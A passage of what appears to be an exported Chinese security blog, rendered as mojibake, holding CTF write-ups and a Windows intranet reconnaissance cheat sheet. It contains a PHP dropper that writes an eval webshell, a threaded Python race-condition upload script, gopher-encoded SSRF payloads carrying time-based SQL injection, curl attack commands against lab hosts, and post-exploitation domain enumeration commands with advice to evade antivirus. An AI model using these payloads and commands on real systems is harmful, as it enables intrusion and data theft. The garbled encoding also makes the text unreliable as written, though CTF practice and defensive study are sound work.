ä»»æ„æ–‡ä»¶ï¼Œç„¶åæ£€æµ‹æ–‡ä»¶ä¸­è‹¥æœ‰webshellï¼Œå°±åˆ é™¤æ–‡ä»¶ï¼›è‹¥ä¸æ˜¯æŒ‡å®šç±»å‹æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±ä½¿ç”¨unlinkåˆ é™¤æ–‡ä»¶ 2.åœ¨åˆ é™¤ä¹‹å‰è®¿é—®ä¸Šä¼ çš„phpæ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œä¸Šä¼ æ–‡ä»¶ä¸­çš„phpä»£ç  ä¸Šä¼ ä»£ç å¦‚ä¸‹ &lt;?php fputs(fopen(\"shell.php\", \"w\"), '&lt;?php @eval($_POST[\"shell\"]); ?&gt;'); ?&gt; è¿™ä¸ªæœ¨é©¬çš„ä½œç”¨å°±æ˜¯ï¼Œå†™å…¥å¦ä¸€ä¸ªæœ¨é©¬ï¼Œå› ä¸ºå³ä½¿æˆ‘ä»¬å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œä»–ä¹Ÿåªä¼šå­˜åœ¨å¾ˆçŸ­çš„æ—¶é—´ï¼Œä¸èƒ½å¤Ÿè®©æˆ‘ä»¬æœ‰è¶³å¤Ÿçš„æ—¶é—´æ‰§è¡Œå‘½ä»¤ï¼Œå°±ç®—ä½ æŠŠå‘½ä»¤ç›´æ¥å†™å…¥äº†ï¼Œä¹Ÿå¯èƒ½ä¼šå­˜åœ¨é¢˜ç›®ä¸å›æ˜¾çš„æƒ…å†µï¼Œæˆ–è€…æ¥ä¸åŠå›æ˜¾çš„æƒ…å†µï¼Œæ‰€ä»¥æœ€ç¨³å¦¥çš„å°±æ˜¯è¦åˆ©ç”¨ä»…å­˜çš„æ—¶é—´å†™å…¥å¦ä¸€ä¸ªä¸ä¼šè¢«åˆ é™¤çš„æœ¨é©¬ å…ˆåˆ©ç”¨bpä¸€ç›´posté‚£ä¸ªæ–‡ä»¶ å½“ç„¶ä¸æƒ³æ‰‹åŠ¨ä¹Ÿå¯ä»¥é…åˆçˆ†ç ´æ¨¡å¼ è¿›è¡Œ burpsuiteé‡å¤å‘åŒ… å°†ä¸¤ä¸ªæ•°æ®åŒ…è°ƒæ•´ä¸ºæ— è´Ÿè½½ï¼Œå¹¶ä¸€ç›´æŒç»­æ”»å‡»ï¼Œæ³¨æ„æŠ“åŒ…çš„çº¿ç¨‹è¦æ¯”ä¸Šä¼ åŒ…å¤š æ³¨æ„çº¿ç¨‹æ•°ä¸è¦å¤ªä½å°±è¡Œï¼Œæ¥ç€è¿è¡Œpyï¼ŒåŒæ—¶å¼€å§‹çˆ†ç ´ ä½¿ç”¨burp suiteé…åˆè„šæœ¬è¿›è¡Œç«äº‰ è„šæœ¬å¦‚ä¸‹ï¼š import requests import threading import os class RaceCondition(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.url = 'http://61.147.171.105:62431/upload/a.php' self.uploadUrl = 'http://61.147.171.105:62431/upload/shell.php' def _get(self): print('try to call uploaded file...') r = requests.get(self.url) if r.status_code == 200: print('[*] create file shell.php success.') os._exit(0) def _upload(self): print('upload file...') rs = requests.get(self.uploadUrl) if rs.status_code == 200: print('[*] create file shell.php success.') os._exit(0) def run(self): while True: for i in range(5): self._get() for i in range(10): self._upload() self._get() if __name__ == '__main__': threads = 50 for i in range(threads): t = RaceCondition() t.start() for i in range(threads): t.join() ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥å¾—åˆ°flag è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ–¹æ³• a.phpä¸Šä¼ ä¸ºï¼š &lt;?php show_source('../flag.php');?&gt; è¿™é‡Œphpç›´æ¥show_sourceåŒ…å«flag.phpå°±ä¸ç”¨å†™shellå•¦ã€‚ æœ€ç»ˆçœ‹äº†é¢˜ç›®è‡ªå¸¦çš„wpä¹Ÿæ²¡å‘ç°é‚£ä¸ªhint.txtçš„ä½œç”¨ï¼Œå¹¶ä¸”é‚£ä¸ªæºç ä¹Ÿä¸æ˜¯åšé¢˜æ—¶å¯ä»¥çœ‹åˆ°çš„ï¼Œå› æ­¤æ¡ä»¶ç«äº‰å®Œå…¨æ˜¯é è‡ªå·±çš„å°è¯• å‚è€ƒæ–‡ç« ï¼š ã€æ„šå…¬ç³»åˆ—ã€‘2023å¹´06æœˆ æ”»é˜²ä¸–ç•Œ-Webï¼ˆwzsc_æ–‡ä»¶ä¸Šä¼ ï¼‰ æ–‡ä»¶ä¸Šä¼ ä¹‹æ¡ä»¶ç«äº‰","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-babyweb","path":"/2023/09/03/babyweb/","content":"é¢˜ç›®æè¿°ï¼š å›½èµ›åä¸œåŒ—-å†…ç½‘è®¿é—® é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¡µé¢æ²¡å•¥ä¿¡æ¯ï¼ŒæŠ“åŒ…ï¼Œæ‰«ç›®å½•å‡æ‰«ä¸åˆ°ï¼Œä¹‹ååˆç”¨acunetixæ‰«äº†ä¹Ÿæ²¡å•¥ä¿¡æ¯ï¼Œå› æ­¤æ²¡å•¥å¤´ç»ªäº†ï¼Œå¼€å§‹å€Ÿé‰´wpã€‚ çœ‹äº†wpå‘ç° ç«Ÿç„¶æœ‰ä¸ªssrf.phpé¡µé¢ï¼Œä½†æˆ‘çš„dirç«Ÿç„¶æ²¡æ‰«åˆ°ã€‚ã€‚ã€‚äºæ˜¯å°†å…¶æ·»åŠ åˆ°äº†å­—å…¸é‡Œ é‚£æˆ‘ä»¬è®¿é—®çœ‹çœ‹ å¦‚ä¸Šå›¾æˆ‘ä»¬å…ˆè¾“å…¥127.0.0.1çœ‹çœ‹ å‘ç°è¿›å…¥äº†æŸä¸ªæ•°æ®åº“é¡µé¢ï¼Œéšåæˆ‘éšä¾¿è¾“äº†å‡ ä¸ªæŸ¥è¯¢è¯­å¥ï¼Œå‡ä¼šé‡å®šå‘åˆ°ssrf.phpé¡µé¢ï¼Œè¿™é‡Œåˆä¸çŸ¥é“ å¦‚ä½•åšäº†ï¼Œçœ‹äº†wpå‘ç°ä»–ç›´æ¥fileåè®®è¯»å–äº†flagã€‚ã€‚ã€‚çœ‹æ¥æˆ‘æƒ³å¤æ‚äº† ä½¿ç”¨æ–‡ä»¶è¯»å–åè®®ï¼šfile:///flag çœ‹äº†å®˜æ–¹wpåå‘ç°è¿™ä¼¼ä¹æ˜¯éé¢„æœŸï¼Œå®˜æ–¹é‡‡ç”¨gopheråè®® å¯¼è‡´éé¢„æœŸè§£æ˜¯å› ä¸ºï¼š preg_match('/file|http://|dict/i', $url); æ­£ç¡®çš„è¿‡æ»¤æ–¹å¼åº”è¯¥æ˜¯ï¼š preg_match('/file|http:\\/\\/|dict/i', $url); ä½†è¿™é‡Œæˆ‘å¹¶ä¸ç†è§£ä¸ºä½•fileèƒ½é€ƒé€¸è¿‡å»ï¼ŒGPT å›ç­”å¦‚ä¸‹ ä¸ç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ \"http://\" æ˜¯å¸¦æœ‰è½¬ä¹‰æ–œæ  \"/\" çš„ã€‚è¿™æ„å‘³ç€å®ƒåªä¼šåŒ¹é…åŒ…å«å…·ä½“çš„å­—ç¬¦ä¸² \"http://\"ï¼Œè€Œä¸ä¼šåŒ¹é…åƒ \"https://\" æˆ– \"http://example.com\" è¿™æ ·çš„å­—ç¬¦ä¸²ã€‚æ­¤å¤–ï¼Œå®ƒä»ç„¶åŒ¹é…åŒ…å« \"file\" æˆ– \"dict\" çš„å­—ç¬¦ä¸²ã€‚ è¿™é‡Œæˆ‘å¤ç°ä¸€ä¸‹å®˜æ–¹ wp ç„¶åå°±æ˜¯ssrf+sqlæ³¨å…¥çš„è€ƒç‚¹ï¼Œè¿™ä¸ªåœ°æ–¹æ²¡æœ‰è¿‡å¤šçš„è¿‡æ»¤ï¼Œä¸»è¦è€ƒå¯Ÿçš„æ˜¯mysqlä¸­å–è¯èƒ½åŠ› ç»™å‡ºä¸€ä¸ªå¯è¡Œçš„sleep() poc sleepå»¶æ—¶æ³¨å…¥çˆ†ç ´fake_flagè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå…¶ä»–çš„pocä»¥æ­¤ç±»æ¨ pocå¦‚ä¸‹ï¼š gopher://127.0.0.1:80/_GET%20%2findex.php%253fquery%253Dselect%252520%25252a%252520from%252520fake_flag%252520where%252520if%252528mid%252528%252528select%252520flag%252520from%252520fake_flag%252520limit%2525200,1%252529,1,1%252529%25253D%252522t%252522,sleep%2525283%252529,0%252529%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250a åœ¨æ³¨å…¥ä¹‹åï¼Œä¼šå‘ç°æ²¡æœ‰åŠæ³•å¾—åˆ°flagï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦å»è€ƒè™‘åˆ°åº•æ˜¯ä¸æ˜¯æ²¡æœ‰æ³¨å…¥å®Œå…¨éƒ¨çš„æ•°æ®åº“ å› ä¸ºdatabaseå’Œshowè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥çœ‹ä¸åˆ°å…¶ä»–æ•°æ®åº“ ä½†æ˜¯é€šè¿‡information_schema.processlistè¡¨æ ¼æ¥æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„sqlå‘½ä»¤ å‘ç°å¯ç–‘æ•°æ®åº“åï¼šhintda91947e762d8c1d0d1b3d72d3369629 ç„¶åè®¿é—®da91947e762d8c1d0d1b3d72d3369629.php å‘ç°ä¹Ÿæ˜¯éœ€è¦å†…ç½‘ï¼Œè€Œä¸”æç¤º you need admin åœ¨è¾“å…¥æ¡†è¾“å…¥da91947e762d8c1d0d1b3d72d3369629 å‘ç°å›æ˜¾äº†admin è¯´æ˜è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ˜¯ç®¡ç†å‘˜ï¼Œ ç„¶åå°±éœ€è¦æˆ‘ä»¬å¸¦ç€è¿™ä¸ªcookieå»ç™»å½•da91947e762d8c1d0d1b3d72d3369629.phpé¡µé¢ æ‰€ä»¥æˆ‘ä»¬æœ€åçš„pocä¸º è¾“å…¥å¯†ç æ‰“sqlæ³¨å…¥ç„¶åå¾—åˆ°setcookieçš„å€¼ curl -g -v http://39.105.136.196:30022/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%252findex.php%253fquery%253Dda91947e762d8c1d0d1b3d72d3369629%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250a å¾—åˆ°è¿”å›çš„é¡µé¢å†…å®¹é‡Œé¢çš„set phpsessid ru1n2mphovds3qosjg3n8o3661 ç„¶åå¸¦ç€è¿™ä¸ªsessionidç»§ç»­æ‰“ curl -g -v http://39.105.136.196:30022/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%252fda91947e762d8c1d0d1b3d72d3369629.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250aCookie%3A%20PHPSESSID%3Dru1n2mphovds3qosjg3n8o3661%3B%250d%250a ä½†æ˜¯è¿™ä¸ªè¿‡ç¨‹æœ‰ç‚¹æ‡µ å‚è€ƒæ–‡ç« ï¼š ã€æ„šå…¬ç³»åˆ—ã€‘2023å¹´06æœˆ æ”»é˜²ä¸–ç•Œ-Webï¼ˆbabywebï¼‰","categories":["babyweb"]},{"title":"å†…ç½‘æ¸—é€å­¦ä¹ -Windowsä¿¡æ¯æœé›†ç¯‡-æŒç»­æ›´æ–°","path":"/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/","content":"å½“æˆ‘ä»¬é€šè¿‡æ¸—é€è¿›å…¥å†…ç½‘ç¯å¢ƒåï¼Œé¢å¯¹çš„æ˜¯ä¸€ç‰‡æœªçŸ¥åŒºåŸŸã€‚éœ€è¦å¯¹å½“å‰æœºå™¨è§’è‰²åˆ¤æ–­ï¼Œå¯¹æœºå™¨æ‰€å¤„åŒºåŸŸåˆ†æã€‚ åˆ¤æ–­æœºå™¨æ‰€å¤„äºç½‘ç»œæ‹“æ‰‘å“ªä¸ªåŒºåŸŸï¼Œæ˜¯åœ¨DMZåŒºã€åŠå…¬åŒºã€æ ¸å¿ƒåŒºã€‚åŒºåŸŸç•Œé™æ˜¯ç›¸å¯¹çš„ 0x01 æœºå™¨è§’è‰²åˆ¤æ–­ æ–‡ä»¶æœåŠ¡å™¨ï¼šé…åˆç¤¾å·¥ï¼Œç”Ÿæˆpayloadæ†ç»‘åˆ°æ–‡ä»¶æœåŠ¡å™¨å…¬ç”¨æ–‡ä»¶ä¸Šï¼Œå¯æ‰¹é‡ä¸Šçº¿ä¸»æœº DNSæœåŠ¡å™¨ï¼šç«¯å£53ï¼Œå¯é€šè¿‡DNSæœåŠ¡å™¨è·å–å†…ç½‘webç³»ç»Ÿä¿¡æ¯ï¼Œæˆ–è€…æ¢æµ‹åŸŸä¿¡æ¯ DHCPæœåŠ¡å™¨ï¼šæŸ¥çœ‹å†…ç½‘å¤šç»„ç½‘æ®µä¿¡æ¯ï¼Œæ›´å¤šçš„è·å–æ‹“è¡¥ä¿¡æ¯ å¼€å‘æµ‹è¯•æœåŠ¡å™¨ï¼šè·å–æºç ï¼Œæ–°çš„ä¿¡æ¯èµ„äº§ï¼Œå¤šå­˜åœ¨å¼±å£ä»¤ ä»£ç†æœåŠ¡å™¨ï¼šè·å–æœåŠ¡å™¨è´¦å·ï¼Œæ‹¿åˆ°å„ç§å¯†ç  webæœåŠ¡å™¨ï¼šå¯èƒ½éœ€è¦ææƒ(ä¸€èˆ¬æ¥è§¦åˆ°çš„ç¯å¢ƒ) ä¸ªäººPCï¼šæŸ¥çœ‹æ˜¯å¦å­˜åœ¨åŸŸç¯å¢ƒ 0x02 æœ¬æœºä¿¡æ¯æ”¶é›† åŒ…æ‹¬æ“ä½œç³»ç»Ÿã€æƒé™ã€å†…ç½‘IPæ®µã€æ€è½¯ã€ç«¯å£ã€æœåŠ¡ã€è¡¥ä¸æƒ…å†µã€ç½‘ç»œè¿æ¥ã€å…±äº«ã€ä¼šè¯ç­‰ã€‚å¦‚æœæ˜¯åŸŸå†…ä¸»æœºï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿã€åº”ç”¨è½¯ä»¶ã€è¡¥ä¸ã€æœåŠ¡ã€æ€è½¯ä¸€èˆ¬éƒ½æ˜¯æ‰¹é‡å®‰è£…çš„ã€‚æ–‡ä»¶å…±äº«/FTPè¿æ¥è®°å½•ã€æµè§ˆå™¨è®¿é—®è®°å½•ã€mstscè¿æ¥è®°å½•ã€sshè¿æ¥è®°å½•ã€‚ å¦‚æœç”±äºä½¿ç”¨äº†x86çš„shellæ— æ³•ä½¿ç”¨å‘½ä»¤ï¼Œéœ€è¦åœ¨å‘½ä»¤å‰åŠ ä¸Šc:\\windows\\sysnativeï¼Œè¿™æ ·å°±èƒ½æ‰§è¡Œx64çš„å‘½ä»¤äº†ã€‚ 2.1 æŸ¥çœ‹ä¸»æœºå hostname 2.2 æŸ¥çœ‹ç‰ˆæœ¬ ver 2.3 æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒå˜é‡ set 2.4 æŸ¥çœ‹å®‰è£…é©±åŠ¨ DRIVERQUERY 2.5 æŸ¥çœ‹æ“ä½œç³»ç»Ÿä¿¡æ¯ 2.5.1 æ¶æ„ wmic os get osarchitecture 2.5.2 ç³»ç»Ÿå wmic os get caption 2.6 æŸ¥çœ‹é€»è¾‘ç›˜ wmic logicaldisk get caption 2.7 æœ¬æœºç½‘ç»œé…ç½® ipconfig /all - ipåœ°å€ä¿¡æ¯ netstat -ano - ç«¯å£ä¿¡æ¯ arp -a - arpè®°å½•ä¿¡æ¯ 2.8 æŸ¥çœ‹å½“å‰ç³»ç»Ÿç‰ˆæœ¬ tipï¼šwmicå‘½ä»¤ é¡ºä¾¿äº†è§£ä¸€ä¸‹wmicå‘½ä»¤ä½œç”¨ WMICï¼ˆWindows Management Instrumentation Command-lineï¼‰æ˜¯Windowsæ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œç”¨äºæ‰§è¡Œå„ç§ç³»ç»Ÿç®¡ç†ä»»åŠ¡å’ŒæŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯ã€‚é€šè¿‡WMICï¼Œç”¨æˆ·å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œå„ç§WMIï¼ˆWindows Management Instrumentationï¼‰æ“ä½œï¼ŒåŒ…æ‹¬æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯ã€ç®¡ç†è¿›ç¨‹ã€æœåŠ¡ã€ç½‘ç»œè®¾ç½®ç­‰ã€‚ WMICæä¾›äº†ä¸°å¯Œçš„å‘½ä»¤ wmic OS get Caption,CSDVersion,OSArchitecture,Version 2.9 æŸ¥çœ‹ä½“ç³»ç»“æ„ echo %PROCESSOR_ARCHITECTURE% 2.10 æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠè½¯ä»¶ä¿¡æ¯ systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" ## è‹±æ–‡ç³»ç»Ÿ systeminfo | findstr /B /C:\"OS åç§°\" /C:\"OS ç‰ˆæœ¬\" ## ä¸­æ–‡ç³»ç»Ÿ è¿™é‡Œä¸çŸ¥ä¸ºä½•æ‰“ä¸å¼€ï¼Œæ‰¾äº†å‡ ç¯‡æ–‡ç« ï¼Œæ„Ÿè§‰æ˜¯ç¯å¢ƒå˜é‡çš„é—®é¢˜ï¼Œè®¾ç½®äº†ä¹‹ååˆå‘ç°è¯­æ³•é”™è¯¯ï¼ŒåŒå¼•å·æ˜¯ä¸­æ–‡ç‰ˆçš„ã€‚ã€‚ã€‚ï¼Œå¥½åœ¨æœ€åæˆåŠŸäº†ï¼Œä¸”ä¸ºä¸­æ–‡ç³»ç»Ÿ 2.11 æŸ¥çœ‹.net frameworkç‰ˆæœ¬ reg query \"HKLM\\Software\\Microsoft\\NET Framework Setup\\NDP\" /s /v version | findstr /i version | sort /+26 /r 2.12 æŸ¥çœ‹è¡¥ä¸åˆ—è¡¨ systeminfo 2.13 æŸ¥çœ‹è¡¥ä¸çš„åç§°ã€æè¿°ã€IDã€å®‰è£…æ—¶é—´ç­‰ wmic qfe get Caption,Description,HotFixID,InstalledOn 2.14 PowerShellæ”¶é›†è½¯ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯ powershell \"Get-WmiObject -class Win32_Product |Select-Object -Property name, version\" 2.15 æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶çš„ç‰ˆæœ¬ã€è·¯å¾„ç­‰ wmic product get name, version æŸ¥çœ‹è½¯ä»¶æ¯”è¾ƒé è°±çš„åšæ³•æ˜¯è¿œç¨‹åŠ è½½æœ¬åœ°psæ–‡ä»¶ï¼Œcsä¸­å¯ä»¥ä½¿ç”¨powershell-import,ä¸Šä¼ ListInstallProgram.ps1åè¾“å…¥ powershell Get-list å°†æ–‡ä»¶æ”¾åˆ°é¶æœºï¼Œæœ¬åœ°åŠ è½½ä¹Ÿå¯ä»¥ shell powershell -exec bypass -Command \"&amp; {Import-Module 'C:\\Users\\HackerQWQ\\Desktop\\ListInstalledProgram.ps1';Get-list}\" è¿™é‡Œå°è¯•äº†åŠå¤©ï¼Œä¸çŸ¥é“ä»å“ªä¸‹æ‰‹ï¼Œè¿˜æ˜¯å¯¹csä¸ç†Ÿæ‚‰ï¼Œä¹‹åæ·±å…¥å­¦ä¹ æ…¢æ…¢æ 2.16 æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™ whoami &amp;&amp; whoami /priv 2.17 æŸ¥è¯¢æœ¬æœºæœåŠ¡ä¿¡æ¯ wmic service list brief 2.18 æŸ¥çœ‹å¼€å¯çš„æœåŠ¡ net start 2.19 wmicæŸ¥è¯¢è¿›ç¨‹ä¿¡æ¯ wmic process list brief 2.20 æŸ¥çœ‹è¿›ç¨‹ tasklist /svc 2.21 æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯ wmic startup get command,caption 2.22 æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡(éœ€è¦é«˜æƒé™) atï¼ˆwin10ä¹‹å‰ï¼‰ chtasks /query /fo LIST /vï¼ˆwin10ä¹‹åï¼‰ 2.23 æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´ net statistics workstation 2.24 æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨ net user 2.25 è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯ net localgroup administrators 2.26 æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ· query user || qwinsta 2.27 æŸ¥çœ‹åœ¨çº¿ç”¨æˆ· quser 2.28 åˆ—å‡ºæ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯çš„å¯¹è¯(éœ€è¦é«˜æƒé™) net session 2.29 æŸ¥è¯¢ç«¯å£åˆ—è¡¨ Windows: netstat -ano linux: netstat -tnlp 2.30 æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨å’Œå¯è®¿é—®çš„åŸŸå…±äº«åˆ—è¡¨ net share ï¼ˆ445ç«¯å£ï¼‰ 2.31 æŸ¥æ‰¾å…±äº«åˆ—è¡¨ wmic share get name,path,status 2.32 ç£ç›˜æ˜ å°„ net use k: \\192.168.1.10\\c$ è¿™é‡Œä¸å¤ªæ‡‚ï¼Œæ²¡æå‡ºæ¥ 2.33 æŸ¥è¯¢è·¯ç”±è¡¨ route print å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨ã€‚å±€åŸŸç½‘å†…arp -aï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰é‡å¤çš„macåœ°å€ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨arpæ¬ºéª—ã€‚æœåŠ¡å™¨ç»‘å®šmacåœ°å€æ–¹å¼é˜²æ­¢arpæ¬ºéª— arp -a 2.34 æŸ¥çœ‹è¿œç¨‹è¿æ¥ä¿¡æ¯ cmdkey /l 2.35 æŸ¥çœ‹æ€è½¯ WMIC /Node:localhost /Namespace:\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List æš‚æ—¶æ²¡æœ‰ 2.36 æŸ¥çœ‹æœ¬åœ°å¯†ç ç­–ç•¥ net accounts 2.37 æŸ¥çœ‹hostsæ–‡ä»¶ï¼š linux:cat /etc/hosts windows:type c:\\Windows\\system32\\drivers\\etc\\hosts 2.38 æŸ¥çœ‹dnsç¼“å­˜ ipconfig /displaydns åˆ—ä¸¾å®‰è£…çš„è½¯ä»¶ ListInstalledProgramé¡¹ç›®åœ°å€:https://github.com/3gstudent/ListInstalledPrograms è‡ªåŠ¨ä¿¡æ¯æ”¶é›† æˆ‘ä»¬å¯ä½¿ç”¨è‡ªåŠ¨åŒ–è„šæœ¬WMICï¼ˆWindows Management Instrumentation Command-Lineï¼ŒWindowsç®¡ç†å·¥å…·å‘½ä»¤è¡Œï¼‰ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•ç‰ˆæœ¬çš„Windows XPçš„ä½æƒé™ç”¨æˆ·ä¸èƒ½è®¿é—®WMICï¼ŒWindows 7ä»¥ä¸Šç‰ˆæœ¬çš„ä½æƒé™ç”¨æˆ·å…è®¸è®¿é—®WMICå¹¶æ‰§è¡Œç›¸å…³æ“ä½œã€‚ æ‰§è¡Œåï¼Œä¼šå°†ä¿¡æ¯æ”¶é›†çš„ç»“æœå†™å…¥HTMLæ–‡æ¡£ã€‚ é¡¹ç›®åœ°å€ï¼šhttp://www.fuzzysecurity.com/scripts/files/wmic_info.rar è·å–ä¸»æœºä¿¡æ¯ä¹Ÿå¯ä»¥ç”¨Seatbelt.exeï¼Œé¡¹ç›®åœ°å€ï¼šhttps://github.com/GhostPack/Seatbelt/tree/masterï¼Œéœ€è¦ç¼–è¯‘ï¼Œæ”¾åˆ°é¶æœºä¸Šæ‰§è¡Œä¸‹åˆ—å‘½ä»¤ shell Seatbelt.exe -group=all &gt; env.txt æœ€å¥½å…ˆå…æ€ä¸€ä¸‹ï¼Œä¸ç„¶360ä¼šä¸€ç›´è­¦å‘Š,csä¸Šçš„æ’ä»¶ä¹Ÿæœ‰é›†æˆSeatbeltï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æ’ä»¶ --è¿™é‡Œç­‰å­¦äº†å…æ€åœ¨æå§ 2.39 å¸¸è§æŸ¥æ¯’è½¯ä»¶è¿›ç¨‹ tasklist /svc éšåå°†ç»“æœæ”¾åˆ°avListä¸­å¯¹æ¯”æŸ¥çœ‹ è¿›ç¨‹ è½¯ä»¶åç§° 360SD.EXE 360æ€æ¯’ 360TRAY.EXE 360å®æ—¶ä¿æŠ¤ ZHUDONGFANGYU.EXE 360ä¸»åŠ¨é˜²å¾¡ KSAFETRAY.EXE é‡‘å±±å«å£« SAFEDOGUPDATECENTER.EXE æœåŠ¡å™¨å®‰å…¨ç‹— MCAFEE MCSHIELD.EXE è¿ˆå…‹è²æ€æ¯’è½¯ä»¶ EGUI.EXE NOD32 AVP.EXE å¡å·´æ–¯åŸº AVGUARD.EXE å°çº¢ä¼ BDAGENT.EXE BITDEFENDER å¯ä»¥ç”¨avListè‡ªåŠ¨åˆ¤æ–­,é¡¹ç›®åœ°å€:https://github.com/gh0stkey/avList 2.40 æµè§ˆå™¨ä¿¡æ¯æ”¶é›† é¡¹ç›®åœ°å€ï¼šhttps://github.com/moonD4rk/HackBrowserData 0x03 åŸŸç¯å¢ƒä¿¡æ¯æ”¶é›† 3.1 åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ ipconfig /all å¯æŸ¥çœ‹ç½‘å…³IPåœ°å€ã€DNSçš„IPåœ°å€ã€åŸŸåã€æœ¬æœºæ˜¯å¦å’ŒDNSæœåŠ¡å™¨å¤„åœ¨åŒä¸€ç½‘æ®µç­‰ã€‚ 3.2 è§£æåŸŸåip é€šè¿‡åå‘è§£ææŸ¥è¯¢å‘½ä»¤nslookupæ¥è§£æåŸŸåçš„IPåœ°å€ï¼Œç”¨è§£æåˆ°çš„IPåœ°å€è¿›è¡Œå¯¹æ¯”ï¼Œåˆ¤æ–­åŸŸæ§æœåŠ¡å™¨å’ŒDNSæœåŠ¡å™¨æ˜¯å¦åœ¨åŒä¸€å°æœºå™¨ä¸Š nslookup hacker.testlab(è¿™é‡Œå†™è‡ªå·±çš„åŸŸæ§åˆ¶æœåŠ¡å™¨åŸŸå) 3.3 æŸ¥çœ‹å½“å‰æƒé™ whoami 3.4 è·å–åŸŸSID whoami /all 3.5 æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦æƒ…ä¿¡æ¯ net user xxx /domain 3.6 æŸ¥çœ‹åŸŸå†…æ‰€æœ‰è´¦å· net user /domain 3.7 å¯¹æ¯”æŸ¥çœ‹â€åŸŸ(åŸŸå)â€å’Œâ€ç™»å½•æœåŠ¡å™¨(åŸŸæ§åˆ¶å™¨)â€çš„ä¿¡æ¯æ˜¯å¦åŒ¹é… systeminfo åŸŸå åŸŸæ§åˆ¶å™¨ 3.8 å¯¹æ¯”æŸ¥çœ‹â€å·¥ä½œç«™åŸŸDNSåç§°(åŸŸå)â€å’Œâ€ç™»å½•åŸŸ(åŸŸæ§åˆ¶å™¨)â€çš„ä¿¡æ¯æ˜¯å¦ç›¸åŒ¹é… net config workstation 3.9 æŸ¥çœ‹æ—¶é—´å¯ä»¥æ‰¾åˆ°åŸŸæ§ net time /domain 3.10 æŸ¥çœ‹åŸŸå¯†ç ç­–ç•¥ net accounts /domain 3.11 æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ net config workstation 3.12 ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜ net localgroup administrators /domain 3.13 è·å–åŸŸæ§ip ping -a xxx.com 3.14 æŸ¥è¯¢åŸŸ net view /domain 3.15 æŸ¥è¯¢åŸŸå†…çš„æ‰€æœ‰è®¡ç®—æœº net view /domain:HACKER 3.16 æŸ¥è¯¢åŸŸçš„æ‰€æœ‰ç»„ï¼ˆenterprise adminsç»„æƒé™æœ€å¤§ï¼‰ net group /domain 3.17 SPNæ‰«æ setspn -T domain -q / è¿™é‡Œæˆ‘ä¼°è®¡åº”è¯¥æ˜¯æ²¡æœ‰spnå§ 3.18 æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„ç”¨æˆ·ç»„ net group â€œdomain adminsâ€ /domain 3.19 æŸ¥è¯¢åŸŸç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·ç»„ net group \"Enterprise admins\" /domain 3.20 æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ net group \"domain controllers\" /domain 3.21 æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„æœºå™¨å nltest /DCLIST:hacker 3.22 æŸ¥çœ‹dnsç¼“å­˜ ipconfig /displaydns 3.23 åˆ—åŸŸæ§cç›˜æ–‡ä»¶(éœ€è¦åŸŸç®¡ç†å‘˜æƒé™) dir \\\\WIN7-TEST.hacker.testlab\\c$ 